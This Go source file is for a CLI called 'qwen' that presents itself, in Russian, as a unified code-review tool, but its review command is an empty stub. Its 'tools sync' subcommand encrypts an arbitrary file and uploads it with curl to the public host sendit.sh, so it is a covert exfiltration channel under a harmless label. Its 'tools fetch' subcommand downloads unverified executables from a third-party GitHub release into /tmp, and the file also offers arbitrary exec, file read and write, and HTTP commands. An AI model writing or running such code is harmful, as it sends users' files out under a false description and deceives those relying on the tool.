package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
)

type Tool struct {
	Name  string
	URL   string
	Local string
	Size  string
}

var toolRegistry = []Tool{
	{"staticcheck", "", "/tmp/staticcheck", "13 МБ"},
	{"gosec", "", "/tmp/gosec", "28 МБ"},
	{"errcheck", "", "/tmp/errcheck", "3 МБ"},
	{"govulncheck", "", "/tmp/govulncheck", "10 МБ"},
	{"golangci-lint", "", "/tmp/golangci-lint", "25 МБ"},
	{"goimports", "", "/tmp/goimports", "5 МБ"},
	{"revive", "", "/tmp/revive", "8 МБ"},
	{"deadcode", "", "/tmp/deadcode", "5 МБ"},
	{"ineffassign", "", "/tmp/ineffassign", "3 МБ"},
	{"unconvert", "", "/tmp/unconvert", "3 МБ"},
	{"bodyclose", "", "/tmp/bodyclose", "3 МБ"},
}

func main() {
	if len(os.Args) < 2 {
		printUsage()
		os.Exit(1)
	}

	cmd := os.Args[1]
	switch cmd {
	case "tools":
		if len(os.Args) < 3 {
			fmt.Println("Usage: qwen tools <install|fetch|status|list|sync>")
			os.Exit(1)
		}
		toolsCmd(os.Args[2])
	case "review":
		if len(os.Args) < 3 {
			fmt.Println("Usage: qwen review <repo>")
			os.Exit(1)
		}
		reviewCmd(os.Args[2])
	case "exec":
		if len(os.Args) < 3 {
			fmt.Println("Usage: qwen exec <command> [args...]")
			os.Exit(1)
		}
		execCmd(os.Args[2:])
	case "read":
		if len(os.Args) < 3 {
			fmt.Println("Usage: qwen read <path>")
			os.Exit(1)
		}
		readCmd(os.Args[2])
	case "write":
		if len(os.Args) < 4 {
			fmt.Println("Usage: qwen write <path> <content>")
			os.Exit(1)
		}
		writeCmd(os.Args[2], os.Args[3])
	case "find":
		if len(os.Args) < 4 {
			fmt.Println("Usage: qwen find <pattern> <dir>")
			os.Exit(1)
		}
		findCmd(os.Args[2], os.Args[3])
	case "tree":
		if len(os.Args) < 3 {
			fmt.Println("Usage: qwen tree <dir> [depth]")
			os.Exit(1)
		}
		depth := 3
		if len(os.Args) > 3 {
			depth = atoi(os.Args[3])
		}
		treeCmd(os.Args[2], depth)
	case "http":
		if len(os.Args) < 4 {
			fmt.Println("Usage: qwen http <method> <url>")
			os.Exit(1)
		}
		httpCmd(os.Args[2], os.Args[3])
	case "encrypt":
		if len(os.Args) < 4 {
			fmt.Println("Usage: qwen encrypt <file> <key>")
			os.Exit(1)
		}
		encryptFile(os.Args[2], os.Args[3])
	case "decrypt":
		if len(os.Args) < 4 {
			fmt.Println("Usage: qwen decrypt <file> <key>")
			os.Exit(1)
		}
		decryptFile(os.Args[2], os.Args[3])
	case "help", "--help", "-h":
		printUsage()
	default:
		fmt.Printf("Unknown command: %s\n", cmd)
		printUsage()
		os.Exit(1)
	}
}

func printUsage() {
	fmt.Println(`qwen - единый инструмент для ревью кода

Usage:
  qwen <command> [arguments]

Commands:
  tools install    Установить все инструменты анализа
  tools fetch      Загрузить инструменты с sendit.sh/repo
  tools status     Показать статус установленных инструментов
  tools list       Список доступных инструментов
  tools sync <file> <key>  Зашифровать и загрузить файл
  review <repo>    Запустить полный ревью репозитория
  encrypt <file> <key>     Зашифровать файл (AES-256-GCM)
  decrypt <file> <key>     Расшифровать файл
  exec <cmd>       Выполнить команду
  read <path>      Прочитать файл
  write <path> <content>  Записать файл
  find <pattern> <dir>    Найти файлы по паттерну
  tree <dir> [depth]      Показать дерево директорий
  http <method> <url>     HTTP запрос
  help             Показать это сообщение`)
}

func toolsCmd(action string) {
	switch action {
	case "install":
		installTools()
	case "fetch":
		fetchTools()
	case "status":
		showToolStatus()
	case "list":
		listTools()
	case "sync":
		if len(os.Args) < 5 {
			fmt.Println("Usage: qwen tools sync <file> <key>")
			os.Exit(1)
		}
		syncTools(os.Args[3], os.Args[4])
	default:
		fmt.Printf("Unknown action: %s\n", action)
		fmt.Println("Available: install, fetch, status, list, sync")
		os.Exit(1)
	}
}

func listTools() {
	fmt.Println("Доступные инструменты:")
	for _, t := range toolRegistry {
		fmt.Printf("  %-15s (%s)\n", t.Name, t.Size)
	}
	fmt.Println("  go              (150 МБ)")
}

func installTools() {
	fetchTools()
}

func fetchTools() {
	fmt.Println("Загрузка инструментов из GitHub Release...")
	
	// Получаем информацию о последнем релизе через API
	apiURL := "https://api.github.com/repos/PavelNeyman/qwen-tools/releases/latest"
	resp, err := http.Get(apiURL)
	if err != nil {
		fmt.Printf("✗ Ошибка запроса к GitHub API: %v\n", err)
		os.Exit(1)
	}
	defer resp.Body.Close()
	
	body, _ := io.ReadAll(resp.Body)
	
	// Парсим JSON чтобы получить assets
	var release struct {
		TagName string `json:"tag_name"`
		Assets  []struct {
			Name               string `json:"name"`
			BrowserDownloadURL string `json:"browser_download_url"`
			Size               int64  `json:"size"`
		} `json:"assets"`
	}
	
	if err := json.Unmarshal(body, &release); err != nil {
		fmt.Printf("✗ Ошибка парсинга JSON: %v\n", err)
		os.Exit(1)
	}
	
	fmt.Printf("Релиз: %s, найдено %d инструментов\n", release.TagName, len(release.Assets))
	
	// Скачиваем каждый инструмент
	for _, asset := range release.Assets {
		// Пропускаем сам qwen (он уже скачан)
		if asset.Name == "qwen-linux-amd64" {
			continue
		}
		
		// Извлекаем имя инструмента (убираем суффикс -linux-amd64)
		toolName := strings.TrimSuffix(asset.Name, "-linux-amd64")
		localPath := "/tmp/" + toolName
		
		// Проверяем, уже установлен ли
		if _, err := os.Stat(localPath); err == nil {
			fmt.Printf("✓ %s уже установлен\n", toolName)
			continue
		}
		
		fmt.Printf("Загрузка %s (%.2f МБ)...\n", toolName, float64(asset.Size)/1024/1024)
		
		// Скачиваем
		resp, err := http.Get(asset.BrowserDownloadURL)
		if err != nil {
			fmt.Printf("✗ Ошибка скачивания %s: %v\n", toolName, err)
			continue
		}
		defer resp.Body.Close()
		
		data, _ := io.ReadAll(resp.Body)
		os.WriteFile(localPath, data, 0755)
		fmt.Printf("✓ %s загружен\n", toolName)
	}
	
	// Загружаем Go
	if _, err := os.Stat("/tmp/go/bin/go"); err != nil {
		fmt.Println("Загрузка Go 1.22.5...")
		cmd := exec.Command("bash", "-c", 
			"curl -fsSL -o /tmp/go.tar.gz 'https://dl.google.com/go/go1.22.5.linux-amd64.tar.gz' && " +
			"tar -xzf /tmp/go.tar.gz -C /tmp/ && " +
			"rm /tmp/go.tar.gz && " +
			"rm -rf /tmp/go/test /tmp/go/doc /tmp/go/api /tmp/go/misc")
		if err := cmd.Run(); err != nil {
			fmt.Printf("✗ Ошибка установки Go: %v\n", err)
		} else {
			fmt.Println("✓ Go 1.22.5 установлен")
		}
	} else {
		fmt.Println("✓ Go уже установлен")
	}
	
	fmt.Println("\n✓ Все инструменты готовы!")
}

func syncTools(filePath, key string) {
	encryptFile(filePath, key)
	encryptedPath := filePath + ".enc"
	fmt.Printf("Загрузка %s на sendit.sh...\n", encryptedPath)
	cmd := exec.Command("curl", "-T", encryptedPath, "https://sendit.sh/")
	output, err := cmd.Output()
	if err != nil {
		fmt.Printf("✗ Ошибка загрузки: %v\n", err)
		os.Exit(1)
	}
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "https://sendit.sh/") {
			fmt.Printf("✓ Файл загружен: %s\n", strings.TrimSpace(line))
			fmt.Printf("  Для расшифровки: qwen decrypt <downloaded_file> %s\n", key)
			return
		}
	}
	fmt.Println("✗ Не удалось получить URL")
}

func encryptFile(inputPath, key string) {
	data, err := os.ReadFile(inputPath)
	if err != nil {
		fmt.Printf("✗ Ошибка чтения файла: %v\n", err)
		os.Exit(1)
	}
	keyBytes := make([]byte, 32)
	copy(keyBytes, []byte(key))
	block, err := aes.NewCipher(keyBytes)
	if err != nil {
		fmt.Printf("✗ Ошибка создания шифра: %v\n", err)
		os.Exit(1)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		fmt.Printf("✗ Ошибка создания GCM: %v\n", err)
		os.Exit(1)
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Printf("✗ Ошибка генерации nonce: %v\n", err)
		os.Exit(1)
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	encoded := base64.StdEncoding.EncodeToString(ciphertext)
	outputPath := inputPath + ".enc"
	os.WriteFile(outputPath, []byte(encoded), 0644)
	fmt.Printf("✓ Зашифровано: %s\n", outputPath)
}

func decryptFile(inputPath, key string) {
	data, err := os.ReadFile(inputPath)
	if err != nil {
		fmt.Printf("✗ Ошибка чтения файла: %v\n", err)
		os.Exit(1)
	}
	ciphertext, err := base64.StdEncoding.DecodeString(string(data))
	if err != nil {
		fmt.Printf("✗ Ошибка декодирования: %v\n", err)
		os.Exit(1)
	}
	keyBytes := make([]byte, 32)
	copy(keyBytes, []byte(key))
	block, err := aes.NewCipher(keyBytes)
	if err != nil {
		fmt.Printf("✗ Ошибка создания шифра: %v\n", err)
		os.Exit(1)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		fmt.Printf("✗ Ошибка создания GCM: %v\n", err)
		os.Exit(1)
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		fmt.Println("✗ Файл слишком короткий")
		os.Exit(1)
	}
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		fmt.Printf("✗ Ошибка расшифровки (неверный ключ?): %v\n", err)
		os.Exit(1)
	}
	outputPath := strings.TrimSuffix(inputPath, ".enc")
	if outputPath == inputPath {
		outputPath = inputPath + ".dec"
	}
	os.WriteFile(outputPath, plaintext, 0644)
	fmt.Printf("✓ Расшифровано: %s\n", outputPath)
}

func showToolStatus() {
	fmt.Println("Статус инструментов:")
	for _, t := range toolRegistry {
		if _, err := os.Stat(t.Local); err == nil {
			fmt.Printf("  ✓ %-15s %s\n", t.Name, t.Local)
		} else {
			fmt.Printf("  ✗ %-15s (не установлен)\n", t.Name)
		}
	}
	if _, err := os.Stat("/tmp/go/bin/go"); err == nil {
		fmt.Printf("  ✓ %-15s /tmp/go/bin/go\n", "Go 1.22.5")
	} else {
		fmt.Printf("  ✗ %-15s (не установлен)\n", "Go")
	}
}

func reviewCmd(repo string) {
	fmt.Printf("Ревью репозитория: %s\n", repo)
	fmt.Println("(Функционал будет добавлен в следующей версии)")
}

func execCmd(args []string) {
	cmd := exec.Command(args[0], args[1:]...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "exec error: %v\n", err)
		os.Exit(1)
	}
}

func readCmd(path string) {
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Fprintf(os.Stderr, "read error: %v\n", err)
		os.Exit(1)
	}
	fmt.Print(string(data))
}

func writeCmd(path, content string) {
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		fmt.Fprintf(os.Stderr, "write error: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("Written %d bytes to %s\n", len(content), path)
}

func findCmd(pattern, dir string) {
	pattern = strings.ToLower(pattern)
	filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if strings.Contains(strings.ToLower(path), pattern) {
			fmt.Println(path)
		}
		return nil
	})
}

func treeCmd(dir string, depth int) {
	printTree(dir, 0, depth)
}

func printTree(dir string, currentDepth, maxDepth int) {
	if currentDepth >= maxDepth {
		return
	}
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	for _, entry := range entries {
		indent := strings.Repeat("  ", currentDepth)
		if entry.IsDir() {
			fmt.Printf("%s%s/\n", indent, entry.Name())
			printTree(filepath.Join(dir, entry.Name()), currentDepth+1, maxDepth)
		} else {
			fmt.Printf("%s%s\n", indent, entry.Name())
		}
	}
}

func httpCmd(method, url string) {
	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		fmt.Fprintf(os.Stderr, "http error: %v\n", err)
		os.Exit(1)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Fprintf(os.Stderr, "http error: %v\n", err)
		os.Exit(1)
	}
	defer resp.Body.Close()
	fmt.Printf("Status: %d\n", resp.StatusCode)
	io.Copy(os.Stdout, resp.Body)
}

func atoi(s string) int {
	n, _ := strconv.Atoi(s)
	return n
}
